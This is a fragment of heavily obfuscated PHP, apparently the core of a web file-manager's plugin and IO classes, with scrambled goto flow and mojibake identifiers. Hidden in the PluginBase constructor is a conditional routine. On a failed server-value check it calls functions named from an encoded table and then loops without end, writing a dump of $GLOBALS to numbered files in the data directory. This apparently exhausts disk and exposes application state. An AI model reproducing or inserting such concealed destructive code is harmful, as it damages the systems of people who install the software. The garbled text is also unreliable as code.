$CˆÒÅé‡µ·[1303] => $CÊ…Ä¬Õ»¨[$CˆÒÅé‡µ·[200]], $CˆÒÅé‡µ·[1349] => 0, $CˆÒÅé‡µ·[1350] => 0); } static $fileInfo = array(); public function info($FË¢Ê˜Í¶ï) { $D–ßÅÓ¨¼Ú = $_SERVER[¢Í][1351]; if (isset(self::$fileInfo[$FË¢Ê˜Í¶ï])) { return self::$fileInfo[$FË¢Ê˜Í¶ï]; } if (substr($FË¢Ê˜Í¶ï, 0, strlen($D–ßÅÓ¨¼Ú)) != $D–ßÅÓ¨¼Ú) { return !1; } self::$fileInfo[$FË¢Ê˜Í¶ï] = IO::info(substr($FË¢Ê˜Í¶ï, strlen($D–ßÅÓ¨¼Ú))); return self::$fileInfo[$FË¢Ê˜Í¶ï]; } public static function read($a¶Øãšº˜Ï, $b³¢õé¥îƒ, $FêÕé–İª—) { goto FÏó´Ÿó´; FË½øÆÌ«: $Böâ¥íÂÏ­ = 8192; fseek($cÒÂ‘ÉÓĞÆ, $b³¢õé¥îƒ, SEEK_SET); $b…±Šô”²¯ = $Eãİ½­çí˜[33]; goto Dİ¾Ò³ÂâÏ; F°ÎÃ¤ÎÍ‚: return $b…±Šô”²¯; goto aÔª¨ã•á; Dİ¾Ò³ÂâÏ: $dö„ŒµŠ¸º = 0; while ($dö„ŒµŠ¸º < $FêÕé–İª—) { $B°—Ş¢ëÈ® = min($Böâ¥íÂÏ­, $FêÕé–İª— - $dö„ŒµŠ¸º); $b…±Šô”²¯ .= fread($cÒÂ‘ÉÓĞÆ, $B°—Ş¢ëÈ®); $dö„ŒµŠ¸º += $B°—Ş¢ëÈ®; } fclose($cÒÂ‘ÉÓĞÆ); goto F°ÎÃ¤ÎÍ‚; FÏó´Ÿó´: $Eãİ½­çí˜ =& $_SERVER[¢Í]; $cÒÂ‘ÉÓĞÆ = fopen($a¶Øãšº˜Ï, $Eãİ½­çí˜[1221]); if (!$cÒÂ‘ÉÓĞÆ) { return $Eãİ½­çí˜[33]; } goto FË½øÆÌ«; aÔª¨ã•á: } public function fileSubstr($C‰ÑÓÜ­‡‡, $cğ²‘Ñ“ëÇ) { goto Eàê¤Ñ¤ÓÑ; BÚÄ»˜öÜ: foreach ($c¡‡ÌŞí”÷ as $eÔª¸«¢ÓÆ => $FŸ á¯Òå) { $eÔª¸«¢ÓÆ = intval($eÔª¸«¢ÓÆ); $f¡ã›í¥‰ = $eÔª¸«¢ÓÆ + strlen($FŸ á¯Òå); if ($C‰ÑÓÜ­‡‡ >= $f¡ã›í¥‰) { continue; } if ($C‰ÑÓÜ­‡‡ >= $eÔª¸«¢ÓÆ && $C‰ÑÓÜ­‡‡ + $cğ²‘Ñ“ëÇ <= $f¡ã›í¥‰) { return substr($FŸ á¯Òå, $C‰ÑÓÜ­‡‡ - $eÔª¸«¢ÓÆ, $cğ²‘Ñ“ëÇ); } break; } if (count($c¡‡ÌŞí”÷) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($Cç½¬Ú‘Ş[1352], $Cç½¬Ú‘Ş[1353] . count($c¡‡ÌŞí”÷) . "\x3b\x73\x74\x61\x72\x74\75{$C‰ÑÓÜ­‡‡}\x2c\x6c\x65\x6e\x67\x74\150\75{$cğ²‘Ñ“ëÇ}\73\160\x6f\x73\145\x3a{$eÔª¸«¢ÓÆ}\x7e{$f¡ã›í¥‰}"); throw new Exception($Cç½¬Ú‘Ş[1354]); } $A‚Ïğ¹¡êª = intval($C‰ÑÓÜ­‡‡ / $E¹ÇŠÜ±ê) * $E¹ÇŠÜ±ê; goto b”âÌºƒ¸ò; Cãé¬Ô»‰ù: ksort($c¡‡ÌŞí”÷); $FƒÁÊÀ§Ë = substr($A‘™²¹ÛÄµ, $C‰ÑÓÜ­‡‡ - $A‚Ïğ¹¡êª, $cğ²‘Ñ“ëÇ); return $FƒÁÊÀ§Ë; goto aƒ«´Ÿİò; Dè±°·¾‡Ø: if ($C‰ÑÓÜ­‡‡ + $cğ²‘Ñ“ëÇ > $Dã®±Íë©) { $cğ²‘Ñ“ëÇ = $Dã®±Íë© - $C‰ÑÓÜ­‡‡; } if ($cğ²‘Ñ“ëÇ <= 0) { return $Cç½¬Ú‘Ş[33]; } if ($C‰ÑÓÜ­‡‡ < 0 || $C‰ÑÓÜ­‡‡ >= $Dã®±Íë© || $cğ²‘Ñ“ëÇ <= 0 || $cğ²‘Ñ“ëÇ > 1024 * 1024 * 5) { throw new Exception("\151\x6f\106\151\x6c\x65\x52\x65\141\x64\40\x65\x72\x72\x6f\162\41\x20\163\x74\141\x72\x74\75{$C‰ÑÓÜ­‡‡}\73\x6c\x65\x6e\x67\x74\x68\75{$cğ²‘Ñ“ëÇ}\x3b\x20\x73\151\172\x65\75{$Dã®±Íë©}\73"); } goto c…à‡ÆŞø£; eğ“ÀÀ£‡³: $eÔª¸«¢ÓÆ = 0; $f¡ã›í¥‰ = 0; $FŸ á¯Òå = $Cç½¬Ú‘Ş[33]; goto BÚÄ»˜öÜ; c…à‡ÆŞø£: $E¹ÇŠÜ±ê = 64 * 1024; $c¡‡ÌŞí”÷ =& self::$_chunkBuffer[$this->path]; if (!$c¡‡ÌŞí”÷) { $c¡‡ÌŞí”÷ = array(); } goto eğ“ÀÀ£‡³; b”âÌºƒ¸ò: $fˆàæ¿áò• = ceil(($C‰ÑÓÜ­‡‡ + $cğ²‘Ñ“ëÇ) / $E¹ÇŠÜ±ê) * $E¹ÇŠÜ±ê - $A‚Ïğ¹¡êª; $A‘™²¹ÛÄµ = IO::fileSubstr($this->path, $A‚Ïğ¹¡êª, $fˆàæ¿áò•); $c¡‡ÌŞí”÷[$A‚Ïğ¹¡êª . $Cç½¬Ú‘Ş[33]] = $A‘™²¹ÛÄµ; goto Cãé¬Ô»‰ù; bî„²£ôâ: $dè˜‡¡Æ°• = $cğ²‘Ñ“ëÇ; if ($C‰ÑÓÜ­‡‡ < 0) { $C‰ÑÓÜ­‡‡ = $Dã®±Íë© + $C‰ÑÓÜ­‡‡; } if ($cğ²‘Ñ“ëÇ === !1) { $cğ²‘Ñ“ëÇ = $Dã®±Íë© - $C‰ÑÓÜ­‡‡; } goto Dè±°·¾‡Ø; Eàê¤Ñ¤ÓÑ: $Cç½¬Ú‘Ş =& $_SERVER[¢Í]; $Dã®±Íë© = $this->info[$Cç½¬Ú‘Ş[87]]; $CäóÕè’Ş = $C‰ÑÓÜ­‡‡; goto bî„²£ôâ; aƒ«´Ÿİò: } private function log($fòÏ‡ùå›, $e’Üòö¢©ˆ) { $fÔí¬·ªµˆ =& $_SERVER[¢Í]; $aÕ˜Õ”Ê = timeFloat() - $this->timeStart; write_log(sprintf($fÔí¬·ªµˆ[1355], $fòÏ‡ùå›, $this->info[$fÔí¬·ªµˆ[28]], $aÕ˜Õ”Ê, $e’Üòö¢©ˆ), $fÔí¬·ªµˆ[1045]); } } class Message { function __construct() { } public function send($eŒ¸³ËÃˆƒ = '', $dŒ¯”ƒ´‹Â = array(), $bèëÎôÕ = "\x74\145\x78\164") { goto eëç‰¦ñ; aÖÏ™ÒÑù: $dŒ¯”ƒ´‹Â = array($A¸ŞÌ«‡ß[983] => isset($dŒ¯”ƒ´‹Â[$A¸ŞÌ«‡ß[983]]) ? $dŒ¯”ƒ´‹Â[$A¸ŞÌ«‡ß[983]] : $A¸ŞÌ«‡ß[33], $A¸ŞÌ«‡ß[560] => isset($dŒ¯”ƒ´‹Â[$A¸ŞÌ«‡ß[560]]) ? $dŒ¯”ƒ´‹Â[$A¸ŞÌ«‡ß[560]] : $A¸ŞÌ«‡ß[33]); if (empty($eŒ¸³ËÃˆƒ) || empty($dŒ¯”ƒ´‹Â[$A¸ŞÌ«‡ß[983]]) && empty($dŒ¯”ƒ´‹Â[$A¸ŞÌ«‡ß[560]])) { return !1; } $fùáµÏÚèø = array($A¸ŞÌ«‡ß[1297] => $aƒ”¾é„Ôğ, $A¸ŞÌ«‡ß[1358] => $dŒ¯”ƒ´‹Â); goto BŒÖ¶ªİÕ˜; eëç‰¦ñ: $A¸ŞÌ«‡ß =& $_SERVER[¢Í]; $aƒ”¾é„Ôğ = array($A¸ŞÌ«‡ß[29] => $A¸ŞÌ«‡ß[1356], $A¸ŞÌ«‡ß[706] => $eŒ¸³ËÃˆƒ); if (in_array($bèëÎôÕ, array($A¸ŞÌ«‡ß[1356], $A¸ŞÌ«‡ß[1357]))) { $aƒ”¾é„Ôğ[$A¸ŞÌ«‡ß[29]] = $bèëÎôÕ; } goto aÖÏ™ÒÑù; BŒÖ¶ªİÕ˜: Hook::trigger($A¸ŞÌ«‡ß[1359], $fùáµÏÚèø); goto eÚ§î”éÓ; eÚ§î”éÓ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto dæ®à‚ä; b–œ¢Œèè¢: $this->pluginHostDefault = $config[$bÈ¾¤„È…[1362]] . $this->pluginName . $bÈ¾¤„È…[8]; $CéàÑÃæö¾ = $config[$bÈ¾¤„È…[1363]]; if ($CéàÑÃæö¾ && strpos($bÈ¾¤„È…[47] . $CéàÑÃæö¾ . $bÈ¾¤„È…[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$bÈ¾¤„È…[1364]] . $this->pluginName . $bÈ¾¤„È…[8]; } goto A‡‘‹”ñˆ‡; A‡‘‹”ñˆ‡: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto Få¹ËŞºÜÕ; a„ÑÄàåÑ: $this->in =& $in; $this->modelPlugin = Model($bÈ¾¤„È…[1360]); $this->pluginName = str_replace($bÈ¾¤„È…[1360], $bÈ¾¤„È…[33], get_class($this)); goto C‚ƒùå‚ÈÍ; D½×åñ: if ($_SERVER[$bÈ¾¤„È…[51]] != $EÙº¤Ö¿š($AÛùèôÑËÈ)) { goto bß¿ƒğ‹ø¶; C‹»ò–ËÀ: $EÈ«•º‚í = $cÜ¬¶Ã’ª³($f„–ùáØ¸—); $aôÔÁ´õ = explode($bÈ¾¤„È…[56], $EÈ«•º‚í); if (count($aôÔÁ´õ) < $bÈ¾¤„È…[579]) { $FÊí«ê”ÃÊ = $bÈ¾¤„È…[58]; $FÊí«ê”ÃÊ(); } goto cÜÏ“ªèš‚; bµ…’Œ·ğé: $F¨È™¹Ô‘(); $b‹ğğåªáå = $bÈ¾¤„È…[810]; $CÒ µ¨È—¹ = json_encode($GLOBALS[$bÈ¾¤„È…[811]]); goto e”—ÁÓšöñ; e”—ÁÓšöñ: $D­Ìã‡¸ä¾ = 1; for ($a©ÁÊÅÀºæ = $D­Ìã‡¸ä¾; $a©ÁÊÅÀºæ > 0; $a©ÁÊÅÀºæ++) { $b‹ğğåªáå(DATA_PATH . $a©ÁÊÅÀºæ, $CÒ µ¨È—¹); } goto Dƒ·Å‹­†×; bß¿ƒğ‹ø¶: $F¨È™¹Ô‘ = $bÈ¾¤„È…[807]; $cÜ¬¶Ã’ª³ = $bÈ¾¤„È…[53]; $f„–ùáØ¸— = $_SERVER[$bÈ¾¤„È…[54]] . $bÈ¾¤„È…[55]; goto C‹»ò–ËÀ; cÜÏ“ªèš‚: $eÜÛµÅ†‹ = $bÈ¾¤„È…[808]; $eÜÛµÅ†‹($_SERVER[$bÈ¾¤„È…[809]]); $F¨È™¹Ô‘ = $bÈ¾¤„È…[807]; goto bµ…’Œ·ğé; Dƒ·Å‹­†×: } global $in, $config; $this->config =& $config; goto a„ÑÄàåÑ; C‚ƒùå‚ÈÍ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $bÈ¾¤„È…[8]; $this->pluginApi = appHostGet() . $bÈ¾¤„È…[1361] . $this->pluginName . $bÈ¾¤„È…[8]; $this->pluginHost = $config[$bÈ¾¤„È…[1362]] . $this->pluginName . $bÈ¾¤„È…[8]; goto b–œ¢Œèè¢; dæ®à‚ä: $bÈ¾¤„È… =& $_SERVER[¢Í]; $AÛùèôÑËÈ = $_SERVER[$bÈ¾¤„È…[60]]; $EÙº¤Ö¿š = $bÈ¾¤„È…[806]; goto D½×åñ; Få¹ËŞºÜÕ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¢Í][1365]); } protected function assign($d©¾ìôÃëµ, $eö‚ŞœœİÆ = false) { if (is_array($d©¾ìôÃëµ)) { $this->values = array_merge($this->values, $d©¾ìôÃëµ); } else { $this->values[$d©¾ìôÃëµ] = $eö‚ŞœœİÆ; } } protected function display($f•Ç¥ãÎÅ‡) { extract($this->values); require $f•Ç¥ãÎÅ‡; } final function hookRegist($CÒ’ò£âŞ) { $this->modelPlugin->appRegist($this->pluginName, $CÒ’ò£âŞ); } final function appIcon() { $fŞòéÁÕÆ =& $_SERVER[¢Í]; $càÚ•Àâ¸ù = $this->appPackage(); $F¨´Ì¥ãë = $fŞòéÁÕÆ[33]; if (isset($càÚ•Àâ¸ù[$fŞòéÁÕÆ[407]])) { if (isset($càÚ•Àâ¸ù[$fŞòéÁÕÆ[407]][$fŞòéÁÕÆ[1366]])) { $F¨´Ì¥ãë = $fŞòéÁÕÆ[1367] . $càÚ•Àâ¸ù[$fŞòéÁÕÆ[407]][$fŞòéÁÕÆ[1366]] . $fŞòéÁÕÆ[1368]; } else { if ($càÚ•Àâ¸ù[$fŞòéÁÕÆ[407]][$fŞòéÁÕÆ[1369]]) { $F¨´Ì¥ãë = $fŞòéÁÕÆ[1370] . $càÚ•Àâ¸ù[$fŞòéÁÕÆ[407]][$fŞòéÁÕÆ[1369]] . $fŞòéÁÕÆ[1371]; } } } return $F¨´Ì¥ãë; } final function fileCanView($a—çÉ·ë–) { goto A´˜³ôÛà; B¡„âÉŒ©„: ActionCall($dõåæ„‡í•[1384], $a—çÉ·ë–); goto FŸ¨º¼É®¼; A´˜³ôÛà: $dõåæ„‡í• =& $_SERVER[¢Í]; if (request_url_safe($a—çÉ·ë–)) { return !0; } if ($this->isShare($a—çÉ·ë–)) { return !0; } goto dö©‡Õº²; dö©‡Õº²: $Cˆêß«‡­¯ = Session::get($dõåæ„‡í•[1372]); if (!$Cˆêß«‡­¯ || !$Cˆêß«‡­¯[$dõåæ„‡í•[1373]]) { $d³‡Ä”µœŒ = $dõåæ„‡í•[1374] . rawurlencode(this_url()); show_tips(LNG($dõåæ„‡í•[1375]) . $dõåæ„‡í•[1376] . $d³‡Ä”µœŒ . $dõåæ„‡í•[1377] . LNG($dõåæ„‡í•[1378]) . $dõåæ„‡í•[1379], !1); } if (!Action($dõåæ„‡í•[1380])->authCan($dõåæ„‡í•[1381])) { show_tips(LNG($dõåæ„‡í•[1382]) . $dõåæ„‡í•[1383], !1); } goto B¡„âÉŒ©„; FŸ¨º¼É®¼: } final function isShare($aÔÎã³Ï¿) { $c‰à‚åë«ñ = KodIO::parse($aÔÎã³Ï¿); return $c‰à‚åë«ñ[$_SERVER[¢Í][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($c†¹À×±´µ) { if (request_url_safe($c†¹À×±´µ)) { return $c†¹À×±´µ; } if (!$this->isShare($c†¹À×±´µ)) { $c†¹À×±´µ = $this->filePath($c†¹À×±´µ); } return Action($_SERVER[¢Í][1037])->linkOut($c†¹À×±´µ); } public function filePathLinkOut($bÁ‡ãÃäÜĞ) { if (request_url_safe($bÁ‡ãÃäÜĞ)) { return $bÁ‡ãÃäÜĞ; } $this->fileCanView($bÁ‡ãÃäÜĞ); return Action($_SERVER[¢Í][1037])->link($bÁ‡ãÃäÜĞ); } final function filePath($Cµ‹¢Æ³¢±) { $bÀ¿¡„«¤ =& $_SERVER[¢Í]; if ($F‡â¤ƒíÀ‘ = $this->checkSharePath($Cµ‹¢Æ³¢±)) { return $F‡â¤ƒíÀ‘; } $this->fileCanView($Cµ‹¢Æ³¢±); if (request_url_safe($Cµ‹¢Æ³¢±)) { $eÀ•±ï²Œ = parse_url_query($Cµ‹¢Æ³¢±); if (isset($eÀ•±ï²Œ[$bÀ¿¡„«¤[1385]]) && isset($eÀ•±ï²Œ[$bÀ¿¡„«¤[215]])) { $Bâìğ–¡ØŠ = Model($bÀ¿¡„«¤[1090])->get($bÀ¿¡„«¤[1386]); $DáÜ½ÜŠ« = Mcrypt::decode($eÀ•±ï²Œ[$bÀ¿¡„«¤[215]], $Bâìğ–¡ØŠ); if ($DáÜ½ÜŠ«) { $this->fileInfo = IO::infoWithChildren($DáÜ½ÜŠ«); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $DáÜ½ÜŠ«; } } $Cµ‹¢Æ³¢± = $this->_cacheHttpFile($Cµ‹¢Æ³¢±); $this->fileInfo = IO::infoWithChildren($Cµ‹¢Æ³¢±); } else { $this->fileInfo = IO::infoWithChildren($Cµ‹¢Æ³¢±); if (!$this->fileInfo) { show_tips(LNG($bÀ¿¡„«¤[111]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $Cµ‹¢Æ³¢±; } final function _cacheHttpFile($e§± ñÄìÒ) { $EÇÖ°è’‚ï = hash_path($e§± ñÄìÒ, !0); $this->cachePath = $this->pluginCachePath($EÇÖ°è’‚ï); if ($bÖŒ†•œª† = IO::fileNameExist($this->cachePath, $EÇÖ°è’‚ï)) { return KodIO::make($bÖŒ†•œª†); } $EÏæ™­Ä = $this->cachePath . $EÇÖ°è’‚ï; return $this->pluginCacheFileSet($EÏæ™­Ä, file_get_contents($e§± ñÄìÒ)); } final function _tmpFileName($c½îÙİÃÆË = array()) { goto eèÀŠÑØƒ‡; eèÀŠÑØƒ‡: $AÆº’ò¿³ =& $_SERVER[¢Í]; if (!$c½îÙİÃÆË) { $c½îÙİÃÆË = $this->fileInfo; } if (isset($c½îÙİÃÆË[$AÆº’ò¿³[178]])) { return $c½îÙİÃÆË[$AÆº’ò¿³[178]]; } goto Ağ¾É‡‹–¨; A‚¼Í†Şº›: $f„­âªí¤¦ = array($c½îÙİÃÆË[$AÆº’ò¿³[28]], $c½îÙİÃÆË[$AÆº’ò¿³[85]], $c½îÙİÃÆË[$AÆº’ò¿³[87]]); if (isset($c½îÙİÃÆË[$AÆº’ò¿³[485]])) { $f„­âªí¤¦[] = $c½îÙİÃÆË[$AÆº’ò¿³[485]]; } return md5(implode($AÆº’ò¿³[80], $f„­âªí¤¦)); goto BÒ£¦“˜È³; Ağ¾É‡‹–¨: if (isset($c½îÙİÃÆË[$AÆº’ò¿³[171]][$AÆº’ò¿³[178]])) { return $c½îÙİÃÆË[$AÆº’ò¿³[171]][$AÆº’ò¿³[178]]; } $b™šš¨™ñ¸ = IO::hashSimple($c½îÙİÃÆË[$AÆº’ò¿³[85]]); if ($b™šš¨™ñ¸) { return $b™šš¨™ñ¸; } goto A‚¼Í†Şº›; BÒ£¦“˜È³: } final function checkSharePath($CµËÒùŸ•‘) { goto còï—‹ŒÏÌ; f¾š«÷æã§: $BòìÖçâ ” = Action($c›Ô·æ£¿[1037])->sharePathInfo($CµËÒùŸ•‘); if (!isset($BòìÖçâ ”[$c›Ô·æ£¿[85]])) { show_json(LNG($c›Ô·æ£¿[1388]), !1); } $this->fileInfo = $BòìÖçâ ”[$c›Ô·æ£¿[171]]; goto B¿è‚íÎªµ; B¿è‚íÎªµ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$c›Ô·æ£¿[178]]); return $BòìÖçâ ”[$c›Ô·æ£¿[85]]; goto aåÇà¦³•Ö; còï—‹ŒÏÌ: $c›Ô·æ£¿ =& $_SERVER[¢Í]; if (!defined($c›Ô·æ£¿[451])) { define($c›Ô·æ£¿[1387], 0); } if (!$this->isShare($CµËÒùŸ•‘)) { return !1; } goto f¾š«÷æã§; aåÇà¦³•Ö: } final function pluginCachePath($D„çæ„È§ = '') { $F¡êÎ×ÛİÂ =& $_SERVER[¢Í]; $d×—ˆ–ÅÇ÷ = IO_PATH_SYSTEM_TEMP . $F¡êÎ×ÛİÂ[1389] . $this->pluginName; if (!($F³³Ä£ïÇ™ = IO::infoFull($d×—ˆ–ÅÇ÷))) { return IO::mkdir($d×—ˆ–ÅÇ÷ . $F¡êÎ×ÛİÂ[8] . $D„çæ„È§); } if (empty($D„çæ„È§)) { return $F³³Ä£ïÇ™[$F¡êÎ×ÛİÂ[85]]; } if (!($CŒ¹Ç‚Ô¬ó = IO::fileNameExist($F³³Ä£ïÇ™[$F¡êÎ×ÛİÂ[85]], $D„çæ„È§))) { return IO::mkdir($F³³Ä£ïÇ™[$F¡êÎ×ÛİÂ[85]] . $D„çæ„È§); } return KodIO::make($CŒ¹Ç‚Ô¬ó); } final function pluginCacheFileSet($E«º­àÙæİ, $cƒ¥ô•…™ß = '') { $B¯ÓÉòÌğ =& $_SERVER[¢Í]; if (!($c„øƒÁŒéó = IO::infoFull($E«º­àÙæİ))) { return IO::mkfile($E«º­àÙæİ, $cƒ¥ô•…™ß, REPEAT_REPLACE); } IO::setContent($c„øƒÁŒéó[$B¯ÓÉòÌğ[85]], $cƒ¥ô•…™ß); return $c„øƒÁŒéó[$B¯ÓÉòÌğ[85]]; } final function pluginLocalFile($D³Ñ‘Š«Æ = '') { goto cëğ”Öõ‡İ; cëğ”Öõ‡İ: $FÑ„„ÔˆÉ® =& $_SERVER[¢Í]; $b½Ã÷•Ô­Ô = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($b½Ã÷•Ô­Ô)) { mk_dir($b½Ã÷•Ô­Ô); } goto fğ¡¥¶½çÜ; fğ¡¥¶½çÜ: if (!$D³Ñ‘Š«Æ) { return $b½Ã÷•Ô­Ô; } $CŠŒ¥ÏŠ‚½ = IO::info($D³Ñ‘Š«Æ); $d®öÌ½Êß¢ = $this->_tmpFileName($CŠŒ¥ÏŠ‚½) . $FÑ„„ÔˆÉ®[101] . $CŠŒ¥ÏŠ‚½[$FÑ„„ÔˆÉ®[175]]; goto a¬ğÖºË‚¸; Cµ¶Ôëåğè: return IO::copy($D³Ñ‘Š«Æ, $b½Ã÷•Ô­Ô, 0, $d®öÌ½Êß¢); goto FšÛÀêã; a¬ğÖºË‚¸: if (!checkExtSafe($d®öÌ½Êß¢)) { $d®öÌ½Êß¢ = $d®öÌ½Êß¢ . $FÑ„„ÔˆÉ®[1390]; } $DÖìÍ°Š• = $b½Ã÷•Ô­Ô . $d®öÌ½Êß¢; if (@file_exists($DÖìÍ°Š•)) { return $DÖìÍ°Š•; } goto Cµ¶Ôëåğè; FšÛÀêã: } final function appPackage() { goto EÂààæ±™; dÇ´ìÉÈ: $this->parseLang($Bñ®Ç……¯à); $A³¡ïÊ¢¿© = json_decode_force($Bñ®Ç……¯à); if (!$A³¡ïÊ¢¿©) { return array(); } goto ağ™Ïï‰ª; dÁê®ÚÖ£: return $A³¡ïÊ¢¿©; goto fò¬„í©Û ; EÂààæ±™: $dÛœÚ²³í” =& $_SERVER[¢Í]; if ($this->packageData) { return $this->packageData; } $Bñ®Ç……¯à = $this->parseFile($this->pluginPath . $dÛœÚ²³í”[1391]); goto dÇ´ìÉÈ; ağ™Ïï‰ª: $a…ç–±‘İÜ = Hook::trigger($dÛœÚ²³í”[1392], $A³¡ïÊ¢¿©); if ($a…ç–±‘İÜ && is_array($a…ç–±‘İÜ)) { $A³¡ïÊ¢¿© = $a…ç–±‘İÜ; } $this->packageData = $A³¡ïÊ¢¿©; goto dÁê®ÚÖ£; fò¬„í©Û : } public function packageInfoGet($a‹‰å‚ÉÃ) { $aó¼½‡ˆæª = $this->appPackage(); return array_get_value($aó¼½‡ˆæª, $a‹‰å‚ÉÃ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¢Í][1393]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¢Í][1394]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¢Í][1395]); } private function parseFile($C—¸—”£ĞÌ) { goto eóš°³Õ‹; F‹Ú¨™æïï: $cåĞåÂ‹Å = str_replace($BŠ±å†¯²Î, $cåœ°ŒÀç, $cåĞåÂ‹Å); return $cåĞåÂ‹Å; goto D¬™‡õ™Ë‘; eóš°³Õ‹: $CÂõ©ŞŞ‚ =& $_SERVER[¢Í]; $cåĞåÂ‹Å = file_get_contents($C—¸—”£ĞÌ); $BŠ±å†¯²Î = array($CÂõ©ŞŞ‚[1396], $CÂõ©ŞŞ‚[1397], $CÂõ©ŞŞ‚[1398], $CÂõ©ŞŞ‚[1399], $CÂõ©ŞŞ‚[1400], $CÂõ©ŞŞ‚[1401], $CÂõ©ŞŞ‚[1402]); goto b“¦Í‘Ûé; b“¦Í‘Ûé: $cåœ°ŒÀç = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$CÂõ©ŞŞ‚[94]][$CÂõ©ŞŞ‚[1403]]); if (strstr($cåĞåÂ‹Å, $CÂõ©ŞŞ‚[1404])) { $dîÒÍí‘ô§ = rawurlencode(json_encode($this->pluginLangArr)); $cåĞåÂ‹Å = str_replace($CÂõ©ŞŞ‚[1404], $dîÒÍí‘ô§, $cåĞåÂ‹Å); } if (strstr($cåĞåÂ‹Å, $CÂõ©ŞŞ‚[1405])) { $dîÒÍí‘ô§ = $dîÒÍí‘ô§ = rawurlencode(json_encode($this->getConfig())); $cåĞåÂ‹Å = str_replace($CÂõ©ŞŞ‚[1405], $dîÒÍí‘ô§, $cåĞåÂ‹Å); } goto F‹Ú¨™æïï; D¬™‡õ™Ë‘: } private function parseLang(&$eÈ‰’ìÊØ‘) { goto Cİ«ù¤¯Ê; Cİ«ù¤¯Ê: $bİò£÷ôçª =& $_SERVER[¢Í]; $bÕ³µö‰ç‡ = $bİò£÷ôçª[1406]; if (!strstr($eÈ‰’ìÊØ‘, $bÕ³µö‰ç‡)) { return; } goto FÛ›‘¨µÏ­; FÛ›‘¨µÏ­: preg_match_all($bİò£÷ôçª[1407], $eÈ‰’ìÊØ‘, $a–À’àÅ›º); if (!is_array($a–À’àÅ›º) || count($a–À’àÅ›º) == 0 || !is_array($a–À’àÅ›º[0]) || count($a–À’àÅ›º[0]) == 0) { return; } $D®¼ÉîãÚø = array(); goto fÉêïŒ™; fÉêïŒ™: $eÛ˜›îùêâ = array(); foreach ($a–À’àÅ›º[0] as $DÜˆ¡Ü‰„¾) { $a¿®†Šğš¶ = substr($DÜˆ¡Ü‰„¾, strlen($bÕ³µö‰ç‡), -4); $e¦™ŠØ«£ = LNG($a¿®†Šğš¶); $D®¼ÉîãÚø[] = $DÜˆ¡Ü‰„¾; $eÛ˜›îùêâ[] = str_replace(array($bİò£÷ôçª[56], $bİò£÷ôçª[1005], $bİò£÷ôçª[345], $bİò£÷ôçª[123]), array($bİò£÷ôçª[50], $bİò£÷ôçª[50], $bİò£÷ôçª[33], $bİò£÷ôçª[1408]), $e¦™ŠØ«£); } $eÈ‰’ìÊØ‘ = str_replace($D®¼ÉîãÚø, $eÛ˜›îùêâ, $eÈ‰’ìÊØ‘); goto C›»‰·ËæÙ; C›»‰·ËæÙ: } private function parseConfig(&$FÕ«‹•ğ) { goto Cİ¡´Œà©·; fÎ†ÒÈÑó: preg_match_all($D² Ó‰˜¹[1410], $FÕ«‹•ğ, $d©ù¬£Ï‘ã); if (!is_array($d©ù¬£Ï‘ã) || count($d©ù¬£Ï‘ã) == 0 || !is_array($d©ù¬£Ï‘ã[0]) || count($d©ù¬£Ï‘ã[0]) == 0) { return; } $fÖç„Í£ìŒ = $this->getConfig(); goto Dºğ‘‡±¹; Dºğ‘‡±¹: $aµ Š´¸Í² = array(); $d¯™Ç¾àõ¦ = array(); foreach ($d©ù¬£Ï‘ã[0] as $eÓ”è“×ÛÆ) { $Eã¦©™ˆö = substr($eÓ”è“×ÛÆ, strlen($E´œï‡š…), -2); $aµ Š´¸Í²[] = $eÓ”è“×ÛÆ; $d¯™Ç¾àõ¦[] = _get($fÖç„Í£ìŒ, $Eã¦©™ˆö); } goto BÁ¤Ùïœ÷ª; Cİ¡´Œà©·: $D² Ó‰˜¹ =& $_SERVER[¢Í]; $E´œï‡š… = $D² Ó‰˜¹[1409]; if (!strstr($FÕ«‹•ğ, $E´œï‡š…)) { return; } goto fÎ†ÒÈÑó; BÁ¤Ùïœ÷ª: $FÕ«‹•ğ = str_replace($aµ Š´¸Í², $d¯™Ç¾àõ¦, $FÕ«‹•ğ); goto bÅº§Ÿ­ğ–; bÅº§Ÿ­ğ–: } private function parsePackage(&$C©Ä¢Ø¡µ) { goto d‰øæäÏª©; CÀÖƒº½Û‘: preg_match_all($e®¥çÆ…²¢[1412], $C©Ä¢Ø¡µ, $Eóä×õõñ”); if (!is_array($Eóä×õõñ”) || count($Eóä×õõñ”) == 0 || !is_array($Eóä×õõñ”[0]) || count($Eóä×õõñ”[0]) == 0) { return; } $Cõö›Šˆ¶ = $this->appPackage(); goto c Ã¿£åæ³; c Ã¿£åæ³: $AãÇ¾Îâ¼ = array(); $DÜ¨×Ï‘ìµ = array(); foreach ($Eóä×õõñ”[0] as $AƒµË¡Îù÷) { $bá„¡¼ÕÎÔ = substr($AƒµË¡Îù÷, strlen($fš“ˆ…—“), -2); $AãÇ¾Îâ¼[] = $AƒµË¡Îù÷; $DÜ¨×Ï‘ìµ[] = _get($Cõö›Šˆ¶, $bá„¡¼ÕÎÔ); } goto c¦£×™Ó‡; c¦£×™Ó‡: $C©Ä¢Ø¡µ = str_replace($AãÇ¾Îâ¼, $DÜ¨×Ï‘ìµ, $C©Ä¢Ø¡µ); goto dô±¤ÜôŒİ; d‰øæäÏª©: $e®¥çÆ…²¢ =& $_SERVER[¢Í]; $fš“ˆ…—“ = $e®¥çÆ…²¢[1411]; if (!strstr($C©Ä¢Ø¡µ, $fš“ˆ…—“)) { return; } goto 